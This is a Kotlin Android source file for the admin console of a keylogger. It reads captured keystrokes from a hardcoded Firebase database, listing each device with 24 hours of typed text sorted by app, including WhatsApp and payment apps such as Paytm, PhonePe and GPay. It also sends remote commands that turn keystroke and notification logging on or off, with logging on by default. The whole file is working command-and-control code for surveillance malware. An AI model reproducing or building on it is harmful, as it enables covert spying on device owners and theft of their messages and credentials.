package com.example.mykeyboardadmin

import android.graphics.Color
import android.os.Bundle
import android.view.LayoutInflater
import android.view.MotionEvent
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.firebase.FirebaseApp
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Date
import java.util.Locale

class AdminMainActivity : AppCompatActivity() {

    private lateinit var recyclerView: RecyclerView
    private lateinit var txtConnectedDevices: TextView
    private lateinit var txtActivityEvents: TextView
    private lateinit var txtAppsToday: TextView
    private lateinit var txtActiveNodes: TextView
    private lateinit var txtLiveStatusPill: TextView

    private val masterDeviceList = mutableListOf<DeviceModel>()
    private lateinit var adapter: DeviceAdapter
    private val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"

    private var devicesListener: ValueEventListener? = null
    private var devicesRef: com.google.firebase.database.DatabaseReference? = null

    data class DeviceModel(
        val name: String,
        var keylogging: Boolean = true,
        var notifications: Boolean = true,
        var selectedAppFilter: String? = null,
        var lastSeenTimestamp: Long = 0L,
        var isExpanded: Boolean = false,
        val rawEntries: MutableList<Triple<Long, String, String>> = mutableListOf()
    ) {
        val logFeed: String
            get() {
                val filtered = if (selectedAppFilter != null) {
                    rawEntries.filter { it.second == selectedAppFilter }
                } else {
                    rawEntries.take(200) // Default last 200 logs on console
                }
                val dateTimeFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                val sb = StringBuilder()
                for (item in filtered) {
                    val dateStr = dateTimeFormat.format(Date(item.first))
                    sb.append("[$dateStr] [${item.second}] ${item.third}\n")
                }
                val totalCount = if (selectedAppFilter != null) {
                    rawEntries.count { it.second == selectedAppFilter }
                } else {
                    rawEntries.size
                }
                return if (sb.isNotEmpty()) {
                    "=== ${selectedAppFilter?.uppercase() ?: "ALL APPS"} TELEMETRY (Last 24h) (Showing ${filtered.size} of $totalCount total) ===\n\n$sb"
                } else {
                    "No telemetry recorded for ${selectedAppFilter ?: "device"} in the last 24 hours."
                }
            }

        val appsTodayMap: Map<String, Int>
            get() {
                val map = mutableMapOf<String, Int>()
                val calendar = Calendar.getInstance()
                val todayDayOfYear = calendar.get(Calendar.DAY_OF_YEAR)
                val todayYear = calendar.get(Calendar.YEAR)
                for (entry in rawEntries) {
                    calendar.timeInMillis = entry.first
                    if (calendar.get(Calendar.DAY_OF_YEAR) == todayDayOfYear && calendar.get(Calendar.YEAR) == todayYear) {
                        map[entry.second] = (map[entry.second] ?: 0) + 1
                    }
                }
                return map
            }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            FirebaseApp.initializeApp(this)
        } catch (e: Exception) {
            e.printStackTrace()
        }
        setContentView(R.layout.activity_admin_main)

        txtConnectedDevices = findViewById<TextView>(R.id.txtConnectedDevices)
        txtActivityEvents = findViewById<TextView>(R.id.txtActivityEvents)
        txtAppsToday = findViewById<TextView>(R.id.txtAppsToday)
        txtActiveNodes = findViewById<TextView>(R.id.txtActiveNodes)
        txtLiveStatusPill = findViewById<TextView>(R.id.txtLiveStatusPill)

        val btnRefresh = findViewById<Button>(R.id.btnRefreshDevices)
        btnRefresh.setOnClickListener {
            loadConnectedDevices()
            Toast.makeText(this, "Refreshed & synced devices!", Toast.LENGTH_SHORT).show()
        }

        recyclerView = findViewById<RecyclerView>(R.id.recyclerViewDevices)
        recyclerView.layoutManager = LinearLayoutManager(this)
        adapter = DeviceAdapter(masterDeviceList) { device, type, newState ->
            val ref = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(device.name)
            if (type == "key") {
                device.keylogging = newState
                ref.child("keylogging").setValue(newState)
                ref.child("status").child("keylogging").setValue(newState)
            } else {
                device.notifications = newState
                ref.child("notifications").setValue(newState)
                ref.child("status").child("notifications").setValue(newState)
            }
            adapter.notifyDataSetChanged()
            Toast.makeText(this, "Command sent to ${device.name}", Toast.LENGTH_SHORT).show()
        }
        recyclerView.adapter = adapter

        loadConnectedDevices()
    }

    override fun onDestroy() {
        super.onDestroy()
        if (devicesListener != null && devicesRef != null) {
            devicesRef?.removeEventListener(devicesListener!!)
        }
    }

    private fun parseTimestamp(value: Any?): Long? {
        val raw = when (value) {
            is Long -> value
            is Number -> value.toLong()
            is String -> value.toLongOrNull()
            else -> null
        } ?: return null

        // Convert Unix timestamps in seconds to milliseconds automatically
        return if (raw in 1..10000000000L) raw * 1000L else raw
    }

    private fun getPrettyAppName(pkg: String): String {
        val cleanPkg = pkg.removePrefix("accessibility_").removePrefix("notification_")
        return when {
            cleanPkg.contains("whatsapp", true) -> "WhatsApp"
            cleanPkg.contains("paytm", true) -> "Paytm"
            cleanPkg.contains("phonepe", true) -> "PhonePe"
            cleanPkg.contains("paisa", true) -> "GPay"
            cleanPkg.contains("navi", true) -> "Navi"
            cleanPkg.contains("chrome", true) -> "Chrome"
            cleanPkg.contains("youtube", true) -> "YouTube"
            cleanPkg.contains("instagram", true) -> "Instagram"
            cleanPkg.contains("dialer", true) -> "Phone"
            cleanPkg.contains("telegram", true) -> "Telegram"
            cleanPkg.contains("settings", true) -> "Settings"
            else -> cleanPkg.substringAfterLast('.')
        }
    }

    private fun loadConnectedDevices() {
        if (devicesListener != null && devicesRef != null) {
            devicesRef?.removeEventListener(devicesListener!!)
        }

        devicesRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
        devicesListener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                var totalEntriesCount = 0
                val now = System.currentTimeMillis()
                val cutoff24h = now - (24L * 60L * 60L * 1000L) // Exactly 24 hours back from this moment
                var maxLastSeen = 0L

                for (child in snapshot.children) {
                    val deviceName = child.key ?: continue
                    var device = masterDeviceList.find { it.name == deviceName }
                    if (device == null) {
                        device = DeviceModel(deviceName)
                        masterDeviceList.add(device)
                        listenToDeviceState(deviceName)
                        listenToDeviceLogs(deviceName)
                    }

                    for (appChild in child.children) {
                        val rawApp = appChild.key ?: continue
                        if (rawApp.startsWith("notification_")) continue // Exclude notifications from app usage/telemetry count
                        for (entry in appChild.children) {
                            val text = entry.child("text").getValue(String::class.java)
                                ?: entry.child("title").getValue(String::class.java)
                                ?: entry.child("typedContent").getValue(String::class.java)
                                ?: continue

                            val timestampMillis = parseTimestamp(entry.child("timestamp").value)
                            if (timestampMillis != null && timestampMillis >= cutoff24h && text.isNotBlank() && text != "null") {
                                totalEntriesCount++
                                if (timestampMillis > maxLastSeen) {
                                    maxLastSeen = timestampMillis
                                }
                            }
                        }
                    }
                }

                // Dual check: Also check admin_commands so all registered nodes appear strictly on home screen
                val cmdRootRef = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands")
                cmdRootRef.get().addOnSuccessListener { cmdSnapshot ->
                    for (cmdChild in cmdSnapshot.children) {
                        val deviceName = cmdChild.key ?: continue
                        if (masterDeviceList.none { it.name == deviceName }) {
                            val device = DeviceModel(deviceName)
                            masterDeviceList.add(device)
                            listenToDeviceState(deviceName)
                            listenToDeviceLogs(deviceName)
                        }
                    }

                    txtConnectedDevices.text = masterDeviceList.size.toString()
                    txtActivityEvents.text = totalEntriesCount.toString()
                    txtAppsToday.text = masterDeviceList.size.toString()

                    val isOnline = (now - maxLastSeen) < 120000L && maxLastSeen > 0L
                    if (isOnline) {
                        txtLiveStatusPill.text = "● ONLINE"
                        txtLiveStatusPill.setTextColor(Color.parseColor("#22C55E"))
                        txtLiveStatusPill.setBackgroundResource(R.drawable.online_pill_background)
                        txtActiveNodes.text = "ONLINE"
                        txtActiveNodes.setTextColor(Color.parseColor("#22C55E"))
                    } else {
                        txtLiveStatusPill.text = "● OFFLINE"
                        txtLiveStatusPill.setTextColor(Color.parseColor("#EF4444"))
                        txtLiveStatusPill.setBackgroundResource(R.drawable.online_pill_background)
                        txtActiveNodes.text = "OFFLINE"
                        txtActiveNodes.setTextColor(Color.parseColor("#EF4444"))
                    }

                    adapter.notifyDataSetChanged()
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        }
        devicesRef?.addValueEventListener(devicesListener!!)
    }

    private fun listenToDeviceState(deviceName: String) {
        val cmdRef = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(deviceName)
        
        cmdRef.child("keylogging").get().addOnSuccessListener { 
            if (!it.exists()) cmdRef.child("keylogging").setValue(true) 
        }
        cmdRef.child("notifications").get().addOnSuccessListener { 
            if (!it.exists()) cmdRef.child("notifications").setValue(true) 
        }

        cmdRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val keyObj = snapshot.child("status").child("keylogging").value
                    ?: snapshot.child("keylogging").value
                val key = when (keyObj) {
                    is Boolean -> keyObj
                    is String -> keyObj.toBoolean()
                    else -> true
                }

                val notifObj = snapshot.child("status").child("notifications").value
                    ?: snapshot.child("notifications").value
                val notif = when (notifObj) {
                    is Boolean -> notifObj
                    is String -> notifObj.toBoolean()
                    else -> true
                }

                val index = masterDeviceList.indexOfFirst { it.name == deviceName }
                if (index != -1) {
                    masterDeviceList[index].keylogging = key
                    masterDeviceList[index].notifications = notif
                    adapter.notifyItemChanged(index)
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun listenToDeviceLogs(deviceName: String) {
        val logRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches").child(deviceName)
        logRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val entries = mutableListOf<Triple<Long, String, String>>()
                val now = System.currentTimeMillis()
                val cutoff24h = now - (24L * 60L * 60L * 1000L) // Exactly 24 hours back from this moment (e.g. 24h window)

                for (appChild in snapshot.children) {
                    val rawApp = appChild.key ?: continue
                    if (rawApp.startsWith("notification_")) continue // Exclude notifications completely - application usage only
                    val prettyApp = getPrettyAppName(rawApp)
                    for (entry in appChild.children) {
                        val text = entry.child("text").getValue(String::class.java)
                            ?: entry.child("title").getValue(String::class.java)
                            ?: entry.child("typedContent").getValue(String::class.java)
                            ?: continue

                        val timestampMillis = parseTimestamp(entry.child("timestamp").value) ?: now

                        // Load strictly within the last 24 hours (from now to 24h back)
                        if (timestampMillis >= cutoff24h && timestampMillis <= now && text.isNotBlank() && text != "null") {
                            entries.add(Triple(timestampMillis, prettyApp, text))
                        }
                    }
                }

                // Sort newest on top
                entries.sortByDescending { it.first }

                val index = masterDeviceList.indexOfFirst { it.name == deviceName }
                if (index != -1) {
                    masterDeviceList[index].rawEntries.clear()
                    masterDeviceList[index].rawEntries.addAll(entries)
                    adapter.notifyItemChanged(index)
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    class DeviceAdapter(
        private val devices: List<DeviceModel>,
        private val onToggle: (DeviceModel, String, Boolean) -> Unit
    ) : RecyclerView.Adapter<DeviceAdapter.ViewHolder>() {

        class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {
            val layoutDeviceHeader: View = view.findViewById<View>(R.id.layoutDeviceHeader)
            val layoutExpandableContent: View = view.findViewById<View>(R.id.layoutExpandableContent)
            val txtDeviceName: TextView = view.findViewById<TextView>(R.id.txtDeviceName)
            val txtDeviceSub: TextView = view.findViewById<TextView>(R.id.txtDeviceSub)
            val txtPresencePill: TextView = view.findViewById<TextView>(R.id.txtPresencePill)
            val btnKey: Button = view.findViewById<Button>(R.id.btnToggleKeyLog)
            val btnNotif: Button = view.findViewById<Button>(R.id.btnToggleNotifLog)
            val txtLog: TextView = view.findViewById<TextView>(R.id.txtDeviceLogConsole)
            val scrollView: View = view.findViewById<View>(R.id.logScrollView)
            val containerDeviceAppsToday: LinearLayout = view.findViewById<LinearLayout>(R.id.containerDeviceAppsToday)
            val layoutFilterHeader: View = view.findViewById<View>(R.id.layoutFilterHeader)
            val txtActiveFilter: TextView = view.findViewById<TextView>(R.id.txtActiveFilter)
            val btnBackToAll: Button = view.findViewById<Button>(R.id.btnBackToAll)
        }

        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
            val view = LayoutInflater.from(parent.context).inflate(R.layout.item_device_control, parent, false)
            return ViewHolder(view)
        }

        override fun onBindViewHolder(holder: ViewHolder, position: Int) {
            val device = devices[position]
            holder.txtDeviceName.text = device.name

            // Update subtitle and expandable content visibility based on isExpanded state
            if (device.isExpanded) {
                holder.txtDeviceSub.text = "Active Node // Expanded (Last 24h Logs)"
                holder.layoutExpandableContent.visibility = View.VISIBLE
            } else {
                holder.txtDeviceSub.text = "Active Node // Tap to Expand Logs"
                holder.layoutExpandableContent.visibility = View.GONE
            }

            // Click header to toggle expand/collapse state
            holder.layoutDeviceHeader.setOnClickListener {
                device.isExpanded = !device.isExpanded
                notifyItemChanged(position)
            }

            if (device.keylogging) {
                holder.btnKey.text = "Key Logger: ON"
                holder.btnKey.setBackgroundResource(R.drawable.btn_green_rounded)
            } else {
                holder.btnKey.text = "Key Logger: OFF"
                holder.btnKey.setBackgroundResource(R.drawable.btn_red_rounded)
            }

            if (device.notifications) {
                holder.btnNotif.text = "Notif Logger: ON"
                holder.btnNotif.setBackgroundResource(R.drawable.btn_green_rounded)
            } else {
                holder.btnNotif.text = "Notif Logger: OFF"
                holder.btnNotif.setBackgroundResource(R.drawable.btn_red_rounded)
            }

            // Filter Header & Back to All button state
            if (device.selectedAppFilter != null) {
                holder.layoutFilterHeader.visibility = View.VISIBLE
                val totalForApp = device.rawEntries.count { it.second == device.selectedAppFilter }
                holder.txtActiveFilter.text = "Filtering: ${device.selectedAppFilter} (24h Logs: $totalForApp)"
                holder.btnBackToAll.setOnClickListener {
                    device.selectedAppFilter = null
                    notifyItemChanged(position)
                }
            } else {
                holder.layoutFilterHeader.visibility = View.GONE
            }

            // Populate per-device Apps Recorded Today with click filtering
            populateDeviceAppsToday(holder.containerDeviceAppsToday, device.appsTodayMap) { appName ->
                device.selectedAppFilter = appName
                notifyItemChanged(position)
            }

            holder.scrollView.setOnTouchListener { v, event ->
                when (event.action) {
                    MotionEvent.ACTION_DOWN, MotionEvent.ACTION_MOVE -> {
                        v.parent.requestDisallowInterceptTouchEvent(true)
                    }
                    MotionEvent.ACTION_UP -> {
                        v.parent.requestDisallowInterceptTouchEvent(false)
                    }
                }
                false
            }
            holder.txtLog.text = device.logFeed

            holder.btnKey.setOnClickListener {
                onToggle(device, "key", !device.keylogging)
            }

            holder.btnNotif.setOnClickListener {
                onToggle(device, "notif", !device.notifications)
            }
        }

        private fun populateDeviceAppsToday(container: LinearLayout, appsMap: Map<String, Int>, onAppClick: (String) -> Unit) {
            val context = container.context
            container.removeAllViews()
            val sortedApps = appsMap.entries.sortedByDescending { it.value }

            if (sortedApps.isEmpty()) {
                val emptyTv = TextView(context).apply {
                    text = "No app usage recorded today."
                    setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 11f)
                    setTextColor(Color.parseColor("#94A3B8"))
                }
                container.addView(emptyTv)
                return
            }

            val maxCount = sortedApps.first().value.toFloat().coerceAtLeast(1f)

            for ((appName, count) in sortedApps) {
                val rowLayout = LinearLayout(context).apply {
                    orientation = LinearLayout.VERTICAL
                    setPadding(0, 4, 0, 4)
                    isClickable = true
                    isFocusable = true
                    setBackgroundColor(Color.parseColor("#161B22"))
                    setOnClickListener {
                        onAppClick(appName)
                    }
                }

                val headerRow = LinearLayout(context).apply {
                    orientation = LinearLayout.HORIZONTAL
                }

                val nameTv = TextView(context).apply {
                    text = "👉 $appName (Tap for full logs)"
                    setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 11f)
                    setTypeface(null, android.graphics.Typeface.BOLD)
                    setTextColor(Color.parseColor("#38BDF8"))
                    layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
                }

                val countTv = TextView(context).apply {
                    text = "$count events"
                    setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 10f)
                    setTextColor(Color.parseColor("#94A3B8"))
                    typeface = android.graphics.Typeface.MONOSPACE
                }

                headerRow.addView(nameTv)
                headerRow.addView(countTv)
                rowLayout.addView(headerRow)

                val barContainer = LinearLayout(context).apply {
                    orientation = LinearLayout.HORIZONTAL
                    layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 5).apply { topMargin = 2 }
                    setBackgroundColor(Color.parseColor("#0A0F1D"))
                }

                val percent = (count.toFloat() / maxCount).coerceIn(0.01f, 1f)
                val fillView = View(context).apply {
                    layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, percent)
                    setBackgroundColor(Color.parseColor("#38BDF8"))
                }
                val emptyView = View(context).apply {
                    layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, 1f - percent)
                }

    // ...
                barContainer.addView(fillView)
                barContainer.addView(emptyView)
                rowLayout.addView(barContainer)

                container.addView(rowLayout)
            }
        }

        override fun getItemCount() = devices.size
    }
}
